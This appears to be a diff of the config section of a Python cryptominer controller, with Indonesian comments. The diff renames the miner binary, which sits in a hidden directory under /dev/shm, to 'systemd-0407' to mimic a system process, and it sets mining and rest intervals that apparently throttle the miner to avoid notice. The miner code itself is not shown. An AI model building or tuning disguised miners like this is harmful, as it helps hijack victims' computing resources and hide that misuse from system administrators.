@@ -4,8 +4,8 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/systemd"  # Lokasi miner
-MINER_NAME = "systemd"  # Nama miner buat kill
+MINER_PATH = "/dev/shm/.cache/systemd-0407"  # Lokasi miner
+MINER_NAME = "systemd-0407"  # Nama miner buat kill
 MINING_TIME = 1200  # 20 menit
 REST_TIME = 300  # 5 menit
 LONG_REST = 600  # 10 menit (dalam detik)
